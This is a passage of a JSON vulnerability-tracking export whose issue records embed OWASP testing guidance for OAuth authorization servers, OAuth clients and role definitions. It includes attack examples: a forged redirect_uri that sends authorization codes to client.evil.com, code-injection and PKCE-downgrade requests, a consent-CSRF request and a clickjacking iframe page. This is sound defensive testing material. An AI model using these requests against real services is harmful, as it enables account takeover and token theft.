leaked in the referrer header.\n\nAfter stepping through the OAuth flow and using the application, a few requests are captured in the request history of an HTTP intercepting proxy. Search for the HTTP referrer header (e.g. \u0060Referer: https://idp.example.com/\u0060) containing the authorization server and client URL in the request history.\nReviewing the HTML meta tags (although this tag is [not supported](https://caniuse.com/mdn-html_elements_meta_name_referrer) on all browsers), or the [Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) could help assess if any credential leakage is happening through the referrer header.\n\n## Related Test Cases\n\n* [Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)\n\n\n\u003Cbr\u003E\n## Tools\n\n* [BurpSuite](https://portswigger.net/burp/releases)\n* [EsPReSSO](https://github.com/portswigger/espresso)\n* [ZAP](https://www.zaproxy.org/)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\n* When implementing OAuth, always consider the technology used and whether the application is a server-side application that can avoid revealing secrets, or a client-side application that cannot.\n* In almost any case, use the Authorization Code flow with PKCE. One exception may be machine-to-machine flows.\n* Use POST parameters or header values to transport secrets.\n* When no other possibilities exists (for example, in legacy applications that can not be migrated), implement additional security headers such as a \u0060Referrer-Policy\u0060.","References":"## References\n\n* [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)\n* [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)\n* [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)\n* [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)\n* [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)\n* [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/17/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"05-Authorization Testing","Description":"05-Authorization Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"de1d0fac-b799-452f-946f-17a41cf48092","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHZ-05-01 Testing for OAuth Authorization Server Weaknesses","Severity":"High","FoundDate":"2024-06-17T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nOAuth stores the identities of users and their corresponding access rights with the Authorization Server (AS). The AS plays a crucial role during the OAuth flow as it grants clients access to resources. To be able to do that securely, it must properly validate parameters that are part of the OAuth flow.\nFailure to validate the parameters may lead to account takeover, unauthorized resource access and the elevation of privileges.","TestingInstructions":"## Test Objectives\n\n* Identify weaknesses in the Authorization Server.\n\n## How to Test\n\nIn order to test for AS weaknesses, you will aim to:\n\n1. Retrieve credentials used for authorization.\n2. Grant yourself access to arbitrary resources through forceful browsing.\n3. Bypass the authorization.\n\n### Testing for Insufficient Redirect URI Validation\n\nIf the \u0060redirect_uri\u0060 is not properly validated, a link can be crafted that contains a URL pointing to a server controlled by an attacker. This can be used to trick the AS into sending an authorization code to the attacker. In the following example, \u0060client.evil.com\u0060 is used as the forged \u0060redirect_uri\u0060.\n\n\u0060\u0060\u0060\nhttps://as.example.com/authorize?client_id=example-client\u0026redirect_uri=http%3A%2F%client.evil.com%2F\u0026state=example\u0026response_mode=fragment\u0026response_type=code\u0026scope=openid\u0026nonce=example\n\u0060\u0060\u0060\n\nIf a user opens this link in the user agent, the AS will redirect the user agent to the malicious URL.\nAn attacker can capture the \u0060code\u0060 value passed in the spoofed URL and then submit it to the AS token endpoint.\nThe following request illustrates an authorization request that sends the \u0060redirect_uri\u0060 to the authorization server. The client \u0060client.example.com\u0060 sends an authorization request to the AS \u0060as.example.com\u0060 with the URL-encoded redirect URI \u0060http%3A%2F%2Fclient.example.com%2F\u0060.\n\n\u0060\u0060\u0060\nGET /authorize\n    ?redirect_uri=http%3A%2F%2Fclient.example.com%2F\n    \u0026client_id=example-client\n    \u0026errorPath=%2Ferror\n    \u0026scope=openid%20profile%20email\n    \u0026response_type=code\n    \u0026response_mode=query\n    \u0026state=example\n    \u0026nonce=example\n    \u0026code_challenge=example\n    \u0026code_challenge_method=S256 HTTP/1.1\nHost: as.example.com\n\u0060\u0060\u0060\n\nThe AS responds with a redirect containing the authorization code. This can be exchanged with an access token in the token request. As shown below, the URL in the \u0060Location\u0060 header is the URI given in the previous \u0060redirect_uri\u0060 parameter.\n\n\u0060\u0060\u0060\nHTTP/1.1 302 Found\nDate: Mon, 18 Oct 2021 20:46:44 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 340\nLocation: http://client.example.com/?code=example\u0026state=example\n\u0060\u0060\u0060\n\nTo test if the AS is vulnerable to insufficient redirect URI validation, capture the traffic with an HTTP intercepting proxy such as ZAP.\n\n1. Start the OAuth flow and pause it at the authorization request.\n2. Change the value of the \u0060redirect_uri\u0060 and observe the response.\n3. Investigate the response and identify if the arbitrary \u0060redirect_uri\u0060 parameter was accepted by the AS.\n\nIf the AS redirects the user agent to the \u0060redirect_uri\u0060 you specified, the AS does not properly validate the \u0060redirect_uri\u0060.\nAdditionally, see the \u0060Common Filter Bypass\u0060 section in [Testing for Server-Side Request Forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery) to identity common bypasses for redirect URI validation.\n\n### Testing for Authorization Code Injection\n\nDuring the Authorization Code flow code exchange, a code is issued by the AS to the client and later exchanged against the token endpoint to retrieve an authorization token and a refresh token.\nConduct the following tests against the AS:\n\n1. Send a valid code for another \u0060client_id\u0060.\n2. Send a valid code for another resource owner.\n3. Send a valid code for another \u0060redirect_uri\u0060.\n4. Resend the code more than once (code replay).\n\n#### Test Public Clients\n\nThe request sent to the token endpoint contains the authorization code. It is exchanged against the token. Capture this request with an HTTP intercepting proxy like ZAP and resend the request with modified values.\n\n\u0060\u0060\u0060\nPOST /oauth/token HTTP/1.1\nHost: as.example.com\n[...]\n\n{\n    \u0022errorPath\u0022:\u0022/error\u0022,\n    \u0022client_id\u0022:\u0022example-client\u0022,\n    \u0022code\u0022:\u0022INJECT_CODE_HERE\u0022,\n    \u0022grant_type\u0022:\u0022authorization_code\u0022,\n    \u0022redirect_uri\u0022:\u0022http://client.example.com\u0022\n}\n\u0060\u0060\u0060\n\nIf the AS responds with an \u0060access_token\u0060, the code was successfully injected.\n\n#### Test Confidential Clients\n\nAs the OAuth flow for confidential clients is additionally protected by a client secret, it is not possible to directly submit an authorization code to the token endpoint. Instead, inject the authorization code into the client. This injected code will then be sent in the token request, issued by the confidential client together with the client secret.\nFirst, capture an authorization code from the AS:\n\n1. Start the authorization code flow with user Alice. Pause when you receive a code from the AS.\n2. Do not submit the code to the client and keep note of the code and corresponding state.\n\nThen, inject the code:\n\n1. Start the authorization code flow with user Mallory and inject the previously gathered code and state values for user Alice into the process.\n2. When the attack is successful, the client should now be in possession of an \u0060authorization_token\u0060 that grants access to resources owned by user Alice.\n\n\u0060\u0060\u0060\nGET /callback?code=INJECT_CODE_HERE\u0026state=example HTTP/1.1\nHost: client.example.com\n[...]\n\u0060\u0060\u0060\n\n### Testing for PKCE Downgrade Attack\n\nUnder certain circumstances the PKCE extension can be removed from the authorization code flow. This has the potential to leave public clients vulnerable to attacks mitigated by the PKCE extension.\nThis can happen when:\n\n* The AS does not support PKCE.\n* The AS does not properly validate PKCE.\n\nBoth can be tested with an HTTP intercepting proxy like ZAP. Conduct the following tests:\n\n1. Send the authorization request without the \u0060code_challenge=sha256(xyz)\u0060 and \u0060code_challenge_method\u0060 parameter.\n2. Send the authorization request with an empty value for the \u0060code_challenge=sha256(xyz)\u0060 parameter.\n3. Send the authorization request with a forged value for the \u0060code_challenge=sha256(xyz)\u0060 parameter\n\nThe example below highlights the values to modify:\n\n\u0060\u0060\u0060\nGET /authorize\n    ?redirect_uri=http%3A%2F%client.example.com\n    \u0026client_id=example-client\n    \u0026errorPath=%2Ferror\n    \u0026scope=openid%20profile%20email\n    \u0026response_type=code\n    \u0026response_mode=web_message\n    \u0026state=example-state\n    \u0026nonce=example-nonce\n    \u0026code_challenge=MODIFY_OR_OMIT_THIS\n    \u0026code_challenge_method=MODIFY_OR_OMIT_THIS\n    \u0026prompt=none HTTP/1.1\nHost: as.example.com\n[...]\n\u0060\u0060\u0060\n\nThe AS should verify the \u0060code_verifier\u0060 value in the token exchange. To test:\n\n1. Send the token request without the \u0060code_verifier\u0060.\n2. Send the token request with an empty \u0060code_verifier\u0060.\n3. Send the token request with a valid \u0060code_verifier\u0060 for a different authorization code.\n\n\u0060\u0060\u0060\nPOST /oauth/token HTTP/1.1\nHost: as.example.com\n[...]\n\n{\n\u0022client_id\u0022:\u0022example-client\u0022,\n\u0022code_verifier\u0022:\u0022MODIFY_OR_OMIT_THIS\u0022,\n\u0022code\u0022:\u0022example\u0022,\n\u0022grant_type\u0022:\u0022authorization_code\u0022,\n\u0022redirect_uri\u0022:\u0022http://client.example.com\u0022\n}\n\u0060\u0060\u0060\n\n### Testing for Consent Page Cross-Site Request Forgery\n\nCSRF attacks are described in [CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery). OAuth can be attacked with CSRF.\nTo prevent CSRF attacks OAuth, leverages the \u0060state\u0060 parameter as an anti-CSRF token.\nOther measures can prevent CSRF attacks as well. The PKCE flow mitigates CSRF. A \u0060nonce\u0060 value may act as an anti-CSRF token as well.\nTest every request that contains one of the anti-CSRF parameters used by OAuth according to the tests described in the [CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery) test cases.\nThe consent page is displayed to a user to verify that this user consents in the client accessing the resource on the users behalf. Attacking the consent page with CSRF may grant an arbitrary client access to a resource on behalf of the user. The steps of this flow are:\n\n1. The Client generates a state parameter and sends it with the consent request.\n2. The User Agent displays the consent page.\n3. The Resource Owner grants access to the Client.\n4. The consent is sent to the AS together with the acknowledged scopes.\n\nUse an HTTP intercepting proxy like ZAP to test whether the state parameter is properly validated.\n\n\u0060\u0060\u0060\nPOST /u/consent?state=Tampered_State HTTP/1.1\nHost: as.example.com\n[...]\n\nstate=MODIFY_OR_OMIT_THIS\n\u0026audience=https%3A%2F%2Fas.example.com%2Fuserinfo\n\u0026scope%5B%5D=profile\n\u0026scope%5B%5D=email\n\u0026action=accept\n\u0060\u0060\u0060\n\n### Testing for Clickjacking\n\nClickjacking is described in [Testing for Clickjacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking). When the consent page is prone to clickjacking and the attacker is in possession of the \u0060client_id\u0060 (for public clients, or the client secret for confidential clients), the attacker can forge the user\u2019s consent and gain access to the requested resource through a rogue client.\n\n#### How to Test\n\nFor this attack to be successful, the attacker needs to load the authorization page in an iframe.\nThe following HTML page can be used to load the authorization page in an iframe:\n\n\u0060\u0060\u0060\n\u003Chtml\u003E\n    \u003Chead\u003E\n        \u003Ctitle\u003EClickjack test page\u003C/title\u003E\n    \u003C/head\u003E\n    \u003Cbody\u003E\n        \u003Ciframe src=\u0022http://as.example.com/auth/realms/example/login-actions/required-action?execution=OAUTH_GRANT\u0026client_id=example-client\u0022 width=\u0022500\u0022 height=\u0022500\u0022\u003E\u003C/iframe\u003E\n    \u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nIf successfully loaded, the site is vulnerable to clickjacking.\nSee [Testing for Clickjacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking) for a detailed description of how such an attack can be conducted.\n\n### Testing Token Lifetime\n\nOAuth has two types of tokens: the access token and the refresh token. An access token should be limited in the duration of its validity. That means it is short-lived: a good duration depends on the application and may be 5 to 15 minutes.\nThe refresh token should be valid for a longer duration. It should be a one-time token that gets replaced each time it has been used.\n\n#### Test Access Token Lifetime Validation\n\nWhen a JSON Web Token (JWT) is used as the access token, it is possible to retrieve the validity of the access token from the decoded JWT. This is described in [Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens). It is possible that the AS does not properly validate the lifetime of the JWT.\nTo test the lifetime of the access token, use an HTTP intercepting proxy such as ZAP. Intercept a request to an endpoint that contains an access token. Put this request in the repeater and let the targeted time pass. The validity of an access token should be between 5 and 15 minutes, depending on the sensitivity of the resources.\nSuch requests may look like the following example. The token could also be transported in other ways, for example, in a cookie.\n\n\u0060\u0060\u0060\nGET /userinfo HTTP/1.1\nHost: as.example.com\n[...]\nAuthorization: Bearer eyJhbGciOiJkaXIiL[...]\n\u0060\u0060\u0060\n\nTest for lifetime validation by sending the request after varying lengths of time have passed, for example, after 5 minutes, 10 minutes, and 30 minutes.\nThis process can be optimized by automating the steps and logging of the server\u2019s response. When a response of HTTP status 403 (instead of HTTP status 200) is received, this can indicate that the access token is no longer valid.\n\n#### Test Refresh Token Lifetime Validation\n\nRefresh tokens have a longer validity period than access tokens. Due to their long validity, they should be invalidated after they are used in an exchange against an access token.\nRefresh tokens are issued in the same token request where the access token is handed out to the client.\nUse an HTTP intercepting proxy such as ZAP. Set up the test by doing the following:\n\n1. Retrieve a valid refresh token.\n2. Capture the request that is used to exchange the refresh token against a new access token.\n3. Send the captured request to the request repeater.\n\nIn the following example, the refresh token is sent as part of the POST body.\n\n\u0060\u0060\u0060\nPOST /token HTTP/1.1\nHost: as.example.com\nCookie: [...]\n[...]\n\ngrant_type=refresh_token\n\u0026refresh_token=eyJhbGciOiJIUz[...]\n\u0026client_id=example-client\n\u0060\u0060\u0060\n\nConduct the following tests:\n\n1. Send the refresh token and determine if the AS hands out an access token.\n2. Repeat the steps with the same refresh token to evaluate how often a single refresh token is accepted.\n\nWhen a JWT is used as the refresh token, it is possible to retrieve the validity of the refresh token from the decoded JWT. This is described in [Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens). The refresh token may be valid for a longer period of time, but should have an expiry date.\nAdditional security can be gained with a theft detection mechanism. If a refresh token is used in a token exchange beyond its validity (or lifetime), the AS invalidates all refresh tokens. To test this mechanism:\n\n1. Send the refresh token and determine if the AS hands out an access token.\n2. Repeat the steps with the same refresh token until it is invalidated.\n3. Use the refresh token from the last token response\n\nIf all refresh tokens that were issued to the client for this resource owner are invalidated, the AS has token theft detection.\n\n## Related Test Cases\n\n* [Testing for Cross Site Request Forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)\n* [Testing for Client-side URL Redirect](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)\n* [Testing for Server-Side Request Forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)\n* [Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)\n* [Testing for Clickjacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking)\n* [Testing Cross Origin Resource Sharing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)\n\n## Tools\n\n* [BurpSuite](https://portswigger.net/burp/releases)\n* [EsPReSSO](https://github.com/portswigger/espresso)\n* [ZAP](https://www.zaproxy.org/)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nMost of the attacks against OAuth AS can be mitigated by validating the existence and content of parameters during the authorization code and token exchange.\nRestrict the time span and allowed usage for credentials such as the authorization code and refresh token. This can mitigate some types of attacks and also limits the use of such credentials for an attacker, if they are gained.\nProper configuration of security mitigation like CORS, anti-CSRF tokens, and anti-clickjacking headers can mitigate or limit the impact of attacks.\n\n* Always validate if all parameters are present, and validate their values.\n* Use the PKCE extension to properly secure the authorization code and token exchange.\n* Do not allow fallback for security features like the PKCE extension.\n* Restrict the lifetime of credentials.\n* Use credentials only once where possible, e.g. the authorization code.\n* Configure available security mitigation like CORS, anti-CSRF tokens, and anti-clickjacking headers.\n\n\n\u003Cbr\u003E\n","References":"## References\n\n* [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)\n* [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)\n* [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)\n* [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)\n* [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)\n* [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/17/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"05-Authorization Testing","Description":"05-Authorization Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"de1d0fac-b799-452f-946f-17a41cf48092","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHZ-05-02 Testing for OAuth Client Weaknesses","Severity":"High","FoundDate":"2024-06-17T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05.2-Testing_for_OAuth_Client_Weaknesses","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05.2-Testing_for_OAuth_Client_Weaknesses","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\\_Application\\_Security\\_Testing/05-Authorization\\_Testing/05.2-Testing\\_for\\_OAuth\\_Client\\_Weaknesses","TestingInstructions":"## Test Objectives\n\n* Identify weaknesses in the OAuth client.\n\n## How to test\n\nIn order to test for client weaknesses, you will aim to:\n\n1. Retrieve credentials used for authorization.\n2. Grant yourself access to arbitrary resources through forceful browsing.\n3. Bypass the authorization.\n\n### Testing for Exposed Client Secret\n\nThe client secret is used to authenticate the client against the Authorization Server (AS) in order to prove that the client is a trusted origin.\nPublic clients are generally not able to store the client secret securely.\nTo identify the client secret in client-side code, conduct reconnaissance on the client-side code.\n\n1. Browse to the application.\n2. Open the browser\u2019s developer tools.\n3. Navigate to the Debugger Tab.\n4. Press Ctrl\u002BShift\u002BF to open the search.\n5. Search for terms similar to \u0060client-secret\u0060 and determine if any are found.\n\nIf this is not successful, you can also:\n\n1. Step through the authorization process with a HTTP intercepting proxy like ZAP.\n2. Retrieve the client secret from the URI in the parameter \u0060client-secret\u0060.\n3. Replace the search term in the above search with the value of the client secret and determine if it is exposed.\n\n### Testing for Improper Token Storage\n\nThe client receives access tokens and ideally stores them in a location where those tokens can be protected from attackers.\nConfidential clients should store tokens in volatile memory to prevent access through other attacks such as local file inclusion, attackers who are able to access the environment, or SQL Injection attacks.\nPublic clients, such as single-page applications, do not have the possibility of storing tokens securely. For example, a cross-site scripting attack allows attackers to access credentials stored in the browser.\nPublic clients may store tokens in the browsers session storage or in a cookie, but not in the local storage. To determine if tokens are improperly stored:\n\n1. Browse to the application.\n2. Retrieve an access token.\n3. Open the browser\u2019s developer tools.\n4. Navigate to the Application Tab.\n5. Locate the Local Storage and view stored data.\n6. Locate the Session Storage and view stored data.\n7. Locate the Cookie Store and view stored data.\n\n### Testing for Access Token Injection\n\nThis attack is only possible when the client uses a response type that directly issues an access token to the client. This occurs with the grant types Implicit Flows, Resource Owner Password Credential, and machine-to-machine flows. See [Testing for OAuth Weaknesses](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses) for further description.\nAccess token injection is successful when an access token is leaked to an attacker and then used to authenticate with the legitimate client.\nTo test for access token injection, follow the steps below. In this example, the authorization token (\u0060ZXhhbXBsZQo=\u0060) was leaked.\n\n1. Intercept the traffic between the client and the authorization server.\n2. Start an OAuth flow with a client using the Implicit Flow grant type.\n3. Inject the stolen access token:\n    * Send a forged authorization response with the stolen access token (\u0060ZXhhbXBsZQo=\u0060) to the client.\n    * Intercept a valid authorization response and replace the access token (\u0060dGVzdGluZwo=\u0060) with the leaked one (\u0060ZXhhbXBsZQo=\u0060).\n\n![A diagram of the access token injection flow](Image Not Found)\n*Figure 4.5.5.2-: Access Token Injection Flow*\n\n## Related Test Cases\n\n* [Testing for Cross Site Request Forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)\n* [Testing for Client-side URL Redirect](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)\n* [Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)\n* [Testing for Clickjacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking)\n* [Testing Cross Origin Resource Sharing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)\n\n## Tools\n\n* [BurpSuite](https://portswigger.net/burp/releases)\n* [EsPReSSO](https://github.com/portswigger/espresso)\n* [ZAP](https://www.zaproxy.org/)\n\n\n","Details":null,"Implication":null,"Recommendation":"## Remediation\n\n* Use a client secret only if the client has the ability to store it securely.\n* Follow best practices to store tokens securely. Treat them with the same security considerations as other credentials.\n* Avoid deprecated OAuth grant types. See [Testing for OAuth Weaknesses](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses) for further description.\n\n\n\u003Cbr\u003E\n","References":"## References\n\n* [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)\n* [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)\n* [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)\n* [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)\n* [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)\n* [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/17/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"05-Authorization Testing","Description":"05-Authorization Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"de1d0fac-b799-452f-946f-17a41cf48092","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-IDNT-01 Test Role Definitions","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nApplications have several types of functionalities and services, and those require access permissions based on the needs of the user. That user could be:\n\n* an administrator, where they manage the application functionalities.\n* an auditor, where they review the application transactions and provide a detailed report.\n* a support engineer, where they help customers debug and fix issues on their accounts.\n* a customer, where they interact with the application and benefit from its services.\n\nIn order to handle these uses and any other use case for that application, role definitions are setup (more commonly known as [RBAC](https://en.wikipedia.org/wiki/Role-based_access_control)). Based on these roles, the user is capable of accomplishing the required task.","TestingInstructions":"## Test Objectives\n\n* Identify and document roles used by the application.\n* Attempt to switch, change, or access another role.\n* Review the granularity of the roles and the needs behind the permissions given.\n\n## How to Test\n\n### Roles Identification\n\nThe tester should start by identifying the application roles being tested through any of the following methods:\n\n* Application documentation.\n* Guidance by the developers or administrators of the application.\n* Application comments.\n* Fuzz possible roles:\n    * cookie variable (*e.g.* \u0060role=admin\u0060, \u0060isAdmin=True\u0060)\n    * account variable (*e.g.* \u0060Role: manager\u0060)\n    * hidden directories or files (*e.g.* \u0060/admin\u0060, \u0060/mod\u0060, \u0060/backups\u0060)\n    * switching to well known users (*e.g.* \u0060admin\u0060, \u0060backups\u0060, etc.)\n\n### Switching to Available Roles\n\nAfter identifying possible attack vectors, the tester needs to test and validate that they can access the available roles.\n\n\u003E Some applications define the roles of the user on creation, through rigorous checks and policies, or by ensuring that the user\u2019s role is properly protected through a signature created by the backend. Finding that roles exist doesn\u2019t mean that they\u2019re a vulnerability.\n\n### Review Roles Permissions\n\nAfter gaining access to the roles on the system, the tester must understand the permissions provided to each role.\nA support engineer shouldn\u2019t be able to conduct administrative functionalities, manage the backups, or conduct any transactions in the place of a user.\nAn administrator shouldn\u2019t have full powers on the system. Sensitive admin functionality should leverage a maker-checker principle, or use MFA to ensure that the administrator is conducting the transaction. A clear example on this was the [Twitter incident in 2020](https://blog.twitter.com/en_us/topics/company/2020/an-update-on-our-security-incident.html).\n\n## Tools\n\nThe above mentioned tests can be conducted without the use of any tool, except the one being used to access the system.\nTo make things easier and more documented, one can use:\n\n* [Burp\u2019s Autorize extension](https://github.com/Quitten/Autorize)\n* [ZAP\u2019s Access Control Testing add-on](https://www.zaproxy.org/docs/desktop/addons/access-control-testing/)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [Role Engineering for Enterprise Security Management, E Coyne \u0026 J Davis, 2007](https://www.bookdepository.co.uk/Role-Engineering-for-Enterprise-Security-Management-Edward-Coyne/9781596932180)\n* [Role engineering and RBAC standards](https://csrc.nist.gov/projects/role-based-access-control#rbac-standard)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"03-Identity Management Testing","Description":"03-Identity Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2e8d945a-036f-4f90-94fe-f3e52f31fa7c","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace 